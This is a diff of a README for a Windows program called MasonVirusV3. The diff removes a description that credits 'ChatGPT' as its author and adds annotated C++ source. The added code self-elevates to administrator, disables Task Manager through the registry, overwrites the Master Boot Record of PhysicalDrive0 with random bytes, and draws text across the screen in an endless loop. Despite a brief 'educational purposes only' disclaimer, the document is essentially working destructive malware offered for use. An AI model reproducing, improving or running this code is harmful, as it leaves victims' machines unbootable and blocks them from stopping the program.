@@ -3,88 +3,142 @@
 ![MasonVirusV3](https://i.ibb.co/R2rKXqY/image.png)
 
 ## Overview
+This program is a demonstration of various advanced system manipulation techniques, including MBR overwriting, disabling system utilities, and simulating visual and input effects. The following sections explain each part of the code in detail.
 
-The **MasonVirusV3** is a malicious program created by a developer known as **ChatGPT**. This virus is designed to cause severe disruption and chaos on the victim's computer, including overwriting the Master Boot Record (MBR), rendering the system unbootable, and creating visual disturbances on the screen. The combination of these effects makes this virus particularly destructive and terrifying.
+---
 
-## What It Does
+### Checking for Administrator Privileges
+```cpp
+bool IsRunningAsAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID adminGroup;
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
+        if (CheckTokenMembership(NULL, adminGroup, &isAdmin) == 0) {
+            isAdmin = FALSE;
+        }
+        FreeSid(adminGroup);
+    }
+    return isAdmin == TRUE;
+}
+```
 
-When executed, the virus performs the following actions:
+- **Purpose**:  
+  This function checks whether the program is running with administrative privileges.
 
-1. **MBR Overwrite**: The virus overwrites the Master Boot Record (MBR) of the system with random data. This action makes the computer unbootable, forcing the victim to reinstall the operating system. 💀
-2. **Screen Distortion**: It uses the `PatBlt` function to invert the colors of the entire screen at random intervals, creating a glitchy, flickering effect. 🎨
-3. **Randomized Colors**: The virus randomly generates RGB color values and applies them to the screen, making the visual effect unpredictable. 🌈
-4. **Simulated Typing**: Random characters are typed on the screen, creating a chaotic and eerie environment. 🖋️
-5. **Mouse Movement**: The virus randomly moves the mouse pointer across the screen, further disorienting the user. 🖱️
-6. **Disable Task Manager**: It prevents the user from accessing Task Manager, making it harder to terminate the program. 🚫
-7. **Infinite Loop**: The program runs in an infinite loop, causing continuous disruptions and making it nearly impossible for the user to regain control. 🔁
+- **How it works**:  
+  1. A security identifier (SID) for the "Administrators" group is created using `AllocateAndInitializeSid`.
+  2. The program checks if the current process's token belongs to this group using `CheckTokenMembership`.
+  3. If the token indicates membership, the function returns `true`, indicating admin privileges.
+  4. The SID is freed after use to prevent memory leaks.
 
-This virus runs silently in the background, causing significant damage to the system and creating a terrifying user experience.
+---
 
-## Technical Details
+### Requesting Administrator Privileges
+```cpp
+void RequestAdminPrivileges() {
+    if (!IsRunningAsAdmin()) {
+        WCHAR szFilePath[MAX_PATH];
+        GetModuleFileName(NULL, szFilePath, MAX_PATH);
+        ShellExecute(NULL, L"runas", szFilePath, NULL, NULL, SW_SHOWNORMAL);
+        ExitProcess(0);
+    }
+}
+```
 
-The virus is built using C++ and leverages several Windows API functions, including:
+- **Purpose**:  
+  This function requests administrative privileges if the program is not already running as an administrator.
 
-- **`GetDesktopWindow`**: Retrieves a handle to the desktop window. 🖥️
-- **`GetWindowDC`**: Retrieves the device context (DC) for the desktop window. 🖱️
-- **`ReleaseDC`**: Releases the device context after use. 🔄
-- **`GetSystemMetrics`**: Retrieves screen width and height for the current display. 📏
-- **`CreateSolidBrush`**: Creates a solid brush with a random color. 🖌️
-- **`SelectObject`**: Selects the brush into the device context. 🎨
-- **`PatBlt`**: Performs a bit-block transfer (used here for inverting the screen colors). 🔲
-- **`WriteFile`**: Used to overwrite the MBR with random data, making the system unbootable. 💾
+- **How it works**:  
+  1. It checks for admin privileges using `IsRunningAsAdmin`.
+  2. If not running as admin, it restarts the program with elevated privileges using `ShellExecute` with the `"runas"` verb.
+  3. The current process exits to allow the elevated instance to take over.
 
-The combination of these actions results in a chaotic and destructive effect, leaving the victim with a non-functional system and an unsettling experience.
+---
 
-## How to Compile
+### Disabling Task Manager
+```cpp
+void DisableTaskManager() {
+    HKEY hKey;
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        DWORD dwData = 1;
+        RegSetValueEx(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&dwData, sizeof(dwData));
+        RegCloseKey(hKey);
+    }
+}
+```
 
-To compile this program, use a C++ compiler such as Visual Studio. Once compiled, you can run the executable file, and the virus will start affecting the system.
+- **Purpose**:  
+  Disables the Task Manager to prevent the user from terminating the program.
 
-### Steps:
-1. Open the code in Visual Studio or another C++ IDE. 💻
-2. Compile the code into an executable (`.exe`). ⚙️
-3. Run the executable on a Windows machine. 🚀
+- **How it works**:  
+  1. Opens the registry key `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System`.
+  2. Sets the value `DisableTaskMgr` to `1`, which disables Task Manager.
+  3. Closes the registry key after making changes.
 
-## Explanation of Code Sections
+---
 
-### Header Files
-The program includes essential headers like `<windows.h>` for Windows API functions, `<random>` for generating random values, and `<thread>` for multithreading capabilities.
+### Overwriting the Master Boot Record (MBR)
+```cpp
+void OverwriteMBR() {
+    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDrive == INVALID_HANDLE_VALUE) {
+        return;
+    }
+    BYTE mbrData[MBR_SIZE];
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<> dis(0, 255);
+    for (int i = 0; i < MBR_SIZE; i++)
+        mbrData[i] = dis(gen);
+    DWORD bytesWritten;
+    WriteFile(hDrive, mbrData, MBR_SIZE, &bytesWritten, NULL);
+    CloseHandle(hDrive);
+}
+```
 
-### Key Constants and Definitions
-- **`SM_CXSCREEN`** and **`SM_CYSCREEN`**: Used to get the screen dimensions.
-- **`MBR_SIZE`**: Represents the size of the Master Boot Record (512 bytes).
+- **Purpose**:  
+  This function overwrites the Master Boot Record (MBR) of the primary physical drive, effectively rendering the system unbootable.
 
-### Admin Check
-The `IsRunningAsAdmin` function checks if the program is running with administrative privileges. Without admin rights, the virus cannot overwrite the MBR.
+- **How it works**:  
+  1. Opens a handle to the primary physical drive (`PhysicalDrive0`) with write access.
+  2. Generates random data to fill a buffer of 512 bytes (the size of the MBR).
+  3. Writes this random data to the drive, overwriting the MBR.
+  4. Closes the handle to the drive.
 
-### MBR Overwrite
-The virus uses the `WriteFile` function to overwrite the MBR with random data. This action corrupts the bootloader, rendering the system unbootable.
+- **Warning**:  
+  This operation is extremely destructive and should only be executed with a full understanding of its consequences.
 
-### Screen Effects
-The program uses `PatBlt` to invert screen colors and `CreateSolidBrush` to apply random colors. These effects are executed in an infinite loop to create a chaotic visual experience.
+---
 
-### Mouse and Typing Simulation
-The virus randomly moves the mouse pointer and simulates typing random characters on the screen, adding to the disorientation.
+### Displaying Random Text on the Screen
+```cpp
+void DisplayRandomText() {
+    HDC hdc;
+    int sx = 0, sy = 0;
+    LPCWSTR lpText = L"ABOLHB"; // ENTER YOUR NAME
+    while (true) {
+        hdc = GetWindowDC(GetDesktopWindow());
+        sx = GetSystemMetrics(SM_CXSCREEN);
+        sy = GetSystemMetrics(SM_CYSCREEN);
+        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
+        Sleep(10);
+    }
+}
+```
 
-### Infinite Loop
-An infinite loop ensures that the virus continues to run until the system is forcibly shut down.
+- **Purpose**:  
+  Randomly displays a predefined text string on the screen at random positions.
+
+- **How it works**:  
+  1. Retrieves the device context (HDC) of the desktop window.
+  2. Calculates the screen dimensions using `GetSystemMetrics`.
+  3. Displays the text at random positions using `TextOutW`.
+  4. The function runs in an infinite loop, continuously displaying the text.
+
+---
 
 ## Disclaimer
+This program contains potentially harmful code, including MBR overwriting, which can permanently damage a computer. Use this code for educational purposes only and at your own risk.
 
-**ChatGPT** does not take responsibility for any misuse of this code. This software is a **malicious virus** designed to cause disruption and is intended for **educational purposes only**. It is **illegal and unethical** to use such programs without the explicit consent of the target user. ⚠️
-
-By using this code, you acknowledge that:
-
-- You are solely responsible for any actions taken with this software. 🛑
-- You will not use this virus to harm others, cause damage to systems, or disrupt the normal operation of any network or device. 🚫
-- You have obtained explicit permission from the owner of the system before running this program. ✅
-
-**ChatGPT** does not condone the use of this virus for malicious purposes. Use it responsibly and only in controlled environments where you have permission to do so. ⚠️
-
-## Warning
-
-Running this virus can cause significant disruptions to your system, including rendering it completely unbootable due to the MBR overwrite. The visual and functional disruptions caused by the program are designed to create fear and chaos. Please be cautious and ensure you are aware of the consequences before executing this program. ⚠️
-
-## License
-
-This software is released under the **Mason License**. Unauthorized use, distribution, or modification is prohibited. 🚫
 
